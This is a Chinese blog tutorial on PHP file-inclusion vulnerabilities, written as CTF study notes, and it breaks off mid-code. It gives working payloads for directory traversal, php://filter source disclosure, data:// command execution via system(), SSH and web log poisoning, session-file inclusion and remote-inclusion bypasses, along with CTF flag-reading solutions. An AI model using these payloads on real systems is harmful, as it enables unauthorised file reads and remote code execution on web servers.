<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
  
  
  
  
  <title>jothon&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="变强一点点">
<meta property="og:type" content="website">
<meta property="og:title" content="jothon&#39;s blog">
<meta property="og:url" content="https://jothon.github.io/index.html">
<meta property="og:site_name" content="jothon&#39;s blog">
<meta property="og:description" content="变强一点点">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="jothon">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="jothon&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/favicon.png">
  
  
  
<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
    
    
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          fancybox: true,
          animate: true,
          isHome: true,
          isPost: false,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>

        <a href="/" class="profilepic">
            
            <img lazy-src="/images/avatar.png" class="js-avatar">
            
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/"></a></h1>
        </hgroup>
        
        
            <form>
                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
            </form>
            <div id="local-search-result"></div>
        
        
            <script type="text/javascript">
                (function() {
                    'use strict';
                    function getMatchData(keyword, data) {
                        var matchData = [];
                        for(var i =0;i<data.length;i++){
                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
                                matchData.push(data[i])
                        }
                        return matchData;
                    }
                    var $input = $('#local-search-input');
                    var $resultContent = $('#local-search-result');
                    $input.keyup(function(){
                        $.ajax({
                            url: '/search.json',
                            dataType: "json",
                            success: function( json ) {
                                var str='<ul class=\"search-result-list\">';                
                                var keyword = $input.val().trim().toLowerCase();
                                $resultContent.innerHTML = "";
                                if ($input.val().trim().length <= 0) {
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                }
                                var results = getMatchData(keyword, json);
                                if(results.length === 0){
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                } 
                                for(var i =0; i<results.length; i++){
                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
                                }
                                str += "</ul>";
                                $resultContent.empty();
                                $resultContent.append(str);
                                $('#switch-area').hide();
                            }
                        });
                    });
                })();
            </script>
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        
        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a  href="/archives/">所有文章</a></li>
                        
                            <li><a  href="/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/">玩转开发工具</a></li>
                        
                            <li><a  href="/categories/digital">玩转数码</a></li>
                        
                            <li><a  href="/categories/algorithm">算法学习</a></li>
                        
                            <li><a  href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl github"  target="_blank" href="/xxxxx" title="github">github</a>
                            
                                <a class="fl weibo"  target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
                            
                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
                            
                        </ul>
                    </nav>
                </section>
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        
                    </div>
                </section>
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.csdn.net/baidu_21483933">csdn</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://segmentfault.com/blog/maocg_web">segmentfault</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.jianshu.com/users/eb37ef89c746/latest_articles">简书</a>
                    
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">爱动漫,爱游戏,爱编程,爱运动,爱的太多了!</div>
                </section>
                
            </div>
        </div>
    </header>
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/images/avatar.png" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/">玩转开发工具</a></li>
                
                    <li><a href="/categories/digital">玩转数码</a></li>
                
                    <li><a href="/categories/algorithm">算法学习</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="github" target="_blank" href="/xxxxx" title="github">github</a>
                    
                        <a class="weibo" target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
                    
                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                    
                </div>
            </nav>
        </header>
    </div>
</nav>
      <div class="body-wrap">
  
    <article id="post-文件包含" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2024/07/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
      <time datetime="2024-07-23T02:08:22.000Z" itemprop="datePublished">2024-07-23</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2024/07/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>misc学习先放一段时间，感觉没进步了，总结一下misc知识点然后开始进击web，之前做了一些web题目，一直没有系统的整理和学习，趁着暑假有时间，那就直接开始吧！</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>文件包含漏洞</code>是指客户端（一般为浏览器）用户通过输入控制动态包含在服务器的文件，从而导致恶意代码的执行及敏感信息的泄露，主要包括<code>本地文件包含LFI</code>和<code>远程文件包含RFI</code>两种形式</p>
<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>常见的文件包含漏洞的形式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = @$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">include $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a><strong>目录</strong></h2><ul>
<li>PHP伪协议利用</li>
<li>日志文件包含</li>
<li>包含临时文件</li>
<li>远程文件包含</li>
</ul>
<p><strong>漏洞危害</strong></p>
<ol>
<li>读取敏感文件</li>
<li>获取webshell</li>
<li>任意命令执行</li>
<li>在某些情况下，根据LFI漏洞的性质，可以运行系统可执行文件</li>
</ol>
<p><strong>存在漏洞的函数</strong>：</p>
<ul>
<li><strong>include()</strong> 只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</li>
<li><strong>require()</strong> 只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</li>
<li><strong>include_once()</strong> 功能include()一样，区别在于当重复调用同一文件时，程序只调用一次。</li>
<li><strong>require_once()</strong> 功能require()一样，区别在于当重复调用同一文件时，程序只调用一次。</li>
</ul>
<p>文件包含功能要实现，<code>需要在PHP的配置文件php.ini中开启allow_url_include；如果是远程文件包含，则除此之外还需要开启allow_url_fopen。</code></p>
<p>考虑常见的几种包含方式</p>
<ul>
<li>同目录包含 <code>file=.htaccess</code></li>
<li>目录遍历 <code>?file=../../../../../../../../../var/lib/locate.db</code></li>
<li>日志注入 <code>?file=../../../../../../../../../var/log/apache/error.log</code></li>
<li>利用 <code>/proc/self/environ</code></li>
</ul>
<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>简介：</p>
<p>文件包含漏洞的产生原因是 PHP 语言在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p>
<p>当被包含的文件在服务器本地时，就形成的本地文件包含漏洞</p>
<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>简介：</p>
<p>目录穿越（也被称为目录遍历&#x2F;directory traversal&#x2F;path traversal）是通过使用 <code>../</code> 等目录控制序列或者文件的绝对路径来访问存储在文件系统上的任意文件和目录，特别是应用程序源代码、配置文件、重要的系统文件等</p>
<h3 id="PHP封装协议-伪协议"><a href="#PHP封装协议-伪协议" class="headerlink" title="PHP封装协议(伪协议)"></a>PHP封装协议(伪协议)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">File://  访问本地文件系统</span><br><span class="line">http://  访问HTTPs网址</span><br><span class="line">ftp://  访问ftp URL</span><br><span class="line">Php://  访问输入输出流</span><br><span class="line">Zlib://  压缩流</span><br><span class="line">Data://  数据</span><br><span class="line">Ssh2://  security shell2</span><br><span class="line">Expect://  处理交互式的流</span><br><span class="line">Glob://  查找匹配的文件路径</span><br></pre></td></tr></table></figure>

<p>php.ini配置文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=off 即不可以包含远程文件。php4存在远程包含&amp;本地包含，php5仅存在本地包含</span><br></pre></td></tr></table></figure>

<p>测试版本&gt;&#x3D;5.2</p>
<h4 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4><p>作用：</p>
<p>用于访问本地文件系统，在CTF中通常用来读取本地文件,且不受allow_url_fopen与allow_url_include的影响。</p>
<p><code>include()/require()/include_once()/require_once()</code>参数可控的情况下</p>
<p>如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的</p>
<p>示例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1. file://[文件的绝对路径和文件名]</span></span><br><span class="line">http://127.0.0.1/include.php?file=file://C:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#2. file://[文件的相对路径和文件名]</span></span><br><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#3. file://[网络路径和文件名]</span></span><br><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure>

<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="**php:&#x2F;&#x2F;**filter"></a>**php:&#x2F;&#x2F;**<strong>filter</strong></h4><blockquote>
<p>利用<code>php://filter</code>查看源代码：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter`是一种元封装器，设计用于数据流打开时的筛选过滤应用；在文件包含中用于读取文件内容，读取后输出`base64编码`后的内容，要获取真实内容的话，`需要进行base64解码</span><br></pre></td></tr></table></figure>

<p>代码实例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line">?file=php://filter/convert.base64-encode/resource=../sss.php</span><br></pre></td></tr></table></figure>

<h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a><strong>php:&#x2F;&#x2F;input</strong></h4><p>利用php伪协议：php:&#x2F;&#x2F;input</p>
<p>利用条件：</p>
<ol>
<li>PHP.ini 中 allow_url_include&#x3D; On php &lt;5.0 ，allow_url_include&#x3D;Off 也可以</li>
</ol>
<p><code>php://input</code>是个可以访问请求的原始数据的只读流。使用时，将要输入的数据以post方式提交</p>
<h4 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a><strong>data伪协议</strong></h4><p>利用php伪协议：<code>data</code></p>
<p>利用条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; 5.2</span><br><span class="line">allow_url_fopen=On &amp;&amp; allow_url_include=On</span><br></pre></td></tr></table></figure>

<p>利用代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">?file=data:text/plain,&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>

<h4 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a><strong>phar:&#x2F;&#x2F;</strong></h4><p>phar:&#x2F;&#x2F; 数据流包装器自PHP 5.3.0起开始。这个参数是就是<code>php解压缩包</code>的一个函数，不管目标文件后缀是什么，都将其当做压缩包来解压</p>
<p>利用条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP&gt;= 5.3.0</span><br></pre></td></tr></table></figure>

<p>用法格式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=phar://压缩包/内部文件</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：绝对路径或相对路径均可；压缩包只能使用<code>zip协议</code>压缩</p>
</blockquote>
<h4 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a><strong>zip:&#x2F;&#x2F;</strong></h4><p>zip伪协议和phar协议类似,但是用法不一样。</p>
<p>利用条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5.2.17 =&lt;php &lt;= 7.0.12</span><br></pre></td></tr></table></figure>

<p>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]zip://xxx.png#shell.php或zip://xxx.zip#shell.php</span><br></pre></td></tr></table></figure>

<h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a><strong>session文件包含</strong></h2><p>利用条件：</p>
<ol>
<li>session的存储位置可以获取 session中的内容可以被控制，传入恶意代码</li>
</ol>
<p>利用思路：</p>
<ol>
<li>通过参数name写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell</li>
<li>通过phpinfo的信息可以获取到session的存储位置</li>
</ol>
<p>此时我们利用这个页面，将用户的get数据存储到session中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$$name=$$_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">$$_SESSION[<span class="string">&quot;name&quot;</span>]=$$name;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可见此时已经将 <strong>phpinfo</strong> 写入到 session文件中，此时我们利用文件包含漏洞去包含这个文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../var/lib/php/sessions/sess_sdmofnu8knlh9jlqe89l8smduu</span><br></pre></td></tr></table></figure>

<h2 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h2><p>常见的日志文件存储路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apache+Linux`日志默认路径：`/etc/httpd/logs/access.log`、`/var/log/httpd/access.log`、`var/log/apache2/access.log`、`var/log/apache2/error.log</span><br><span class="line">apache+win2003`日志默认路径：`D:\xampp\apache\logs\access.log`、`D:\xampp\apache\logs\error.log</span><br><span class="line">IIS6.0+win2003`默认日志文件：`C:\WINDOWS\system32\Logfiles` `IIS7.0+win2003` 默认日志文件：`%SystemDrive%\inetpub\logs\LogFiles</span><br></pre></td></tr></table></figure>

<p><code>nginx</code> 日志文件：日志文件在用户安装目录logs目录下,假设安装路径为<code>/usr/local/nginx</code>或者<code>var/log/nginx/</code>,那日志目录就是在<code>/usr/local/nginx/logs</code>或者<code>var/log/nginx/access.log</code>下面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apache+linux` 默认配置文件：`/etc/httpd/conf/httpd.conf`或`/etc/init.d/httpd` `IIS6.0+win2003`` `配置文件：`C:/Windows/system32/inetsrv/metabase.xml</span><br><span class="line">IIS7.0+WIN `配置文件：`C:\Windows\System32\inetsrv\config\applicationHost.config</span><br></pre></td></tr></table></figure>

<h3 id="apache-nginx-报错日志"><a href="#apache-nginx-报错日志" class="headerlink" title="apache&#x2F;nginx 报错日志"></a><strong>apache</strong><strong>&#x2F;nginx 报错日志</strong></h3><p><strong>访问日志</strong></p>
<p>可利用条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要知道服务器日志的存储路径，且日志文件可读</span><br></pre></td></tr></table></figure>

<p>利用原理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log</span><br></pre></td></tr></table></figure>

<p>利用文件包含漏洞去包含log文件</p>
<p><img src="/img/1721784913663-13.png" alt="img"></p>
<h3 id="SSH-登录日志"><a href="#SSH-登录日志" class="headerlink" title="SSH 登录日志"></a><strong>SSH</strong> <strong>登录日志</strong></h3><p>利用条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要知道ssh-log的位置，且可读</span><br></pre></td></tr></table></figure>

<p>ssh日志默认路径：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/log/auth.log（默认情况下，所有用户都可读）</span><br><span class="line">/var/log/secure</span><br></pre></td></tr></table></figure>

<p>使用ssh客户端：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php phpinfo();?&gt;&#x27;@IP</span><br></pre></td></tr></table></figure>

<p><img src="/img/1721784913661-1.png" alt="img"></p>
<h2 id="临时文件包含"><a href="#临时文件包含" class="headerlink" title="临时文件包含"></a><strong>临时文件包含</strong></h2><p>php 中上传文件，会创建临时文件。在 linux 下使用 &#x2F;tmp 目录，而在 windows 下使用 <code>c:\winsdows\temp</code> 目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
<p><strong>漏洞原理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。</span><br><span class="line">同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，自然也包含临时文件名。</span><br></pre></td></tr></table></figure>

<p><strong>利用原理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell，这里需要利用到条件竞争</span><br></pre></td></tr></table></figure>

<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a><strong>远程文件包含</strong></h2><p>在PHP 5.2后，<code>php.ini</code>默认配置下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on</span><br><span class="line">allow_url_include=off</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此时除非网站管理员开启配置 否则无法远程文件包含。在某些CTF题中可能遇到。只做了解即可</p>
</blockquote>
<h3 id="远程文件绕过技巧"><a href="#远程文件绕过技巧" class="headerlink" title="远程文件绕过技巧"></a>远程文件绕过技巧</h3><ol>
<li>问号绕过</li>
</ol>
<p>包含目标<code>PHP</code>页面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=http://192.168.91.139/phpinfo.php?</span><br></pre></td></tr></table></figure>

<ol>
<li>#号绕过：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=http://192.168.91.139/phpinfo.php#</span><br></pre></td></tr></table></figure>

<h2 id="其他绕过方式"><a href="#其他绕过方式" class="headerlink" title="其他绕过方式"></a>其他绕过方式</h2><h3 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h3><p>如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过</p>
<h3 id="特殊字符绕过"><a href="#特殊字符绕过" class="headerlink" title="特殊字符绕过"></a>特殊字符绕过</h3><ul>
<li>某些情况下，读文件支持使用Shell通配符，如 <code>?</code> <code>*</code> 等</li>
<li>url中 使用 <code>?</code> <code>#</code> 可能会影响include包含的结果</li>
<li>某些情况下，unicode编码不同但是字形相近的字符有同一个效果</li>
</ul>
<p>这里也就是指的是上述的远程文件绕过技巧</p>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>几乎是最常用的方法，条件是 <code>magic_quotes_gpc</code> 关闭，而且php版本小于5.3.4。</p>
<p>这里先了解一下，后面在出相关讲解和例题分析</p>
<p>以下例题只涉及上述部分知识，等以后做到相关其他知识的题在补充进来</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a><strong>Web_php_include</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>strstr()：</p>
<p>搜索字符串在另一个字符串中是否存在，如果是，返回字符串及剩余部分，否则返回false。</p>
<p>分析代码可知程序过滤掉了page&#x3D;php:&#x2F;&#x2F;</p>
<p>可以使用data伪协议</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain,&lt;?php system(&quot;ls&quot;)?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/1721784913661-2.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;)?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/1721784913661-3.png" alt="img"></p>
<p><img src="/img/1721784913661-4.png" alt="img"></p>
<h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a><strong>[极客大挑战 2019]Secret File</strong></h3><p>考察知识点：<strong>bp<strong><strong>抓包</strong></strong>，文件包含-伪协议</strong></p>
<p>查看页面源代码，发现</p>
<p><img src="/img/1721784913661-5.png" alt="img"></p>
<p>进去看看</p>
<p><img src="/img/1721784913661-6.png" alt="img"></p>
<p>仍然没啥用，再次查看源代码，发现action.php,进去看看直接到了end页面，猜测反应太快，试试抓包</p>
<p>发现secr3t.php</p>
<p><img src="/img/1721784913662-7.png" alt="img"></p>
<p>之后为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span 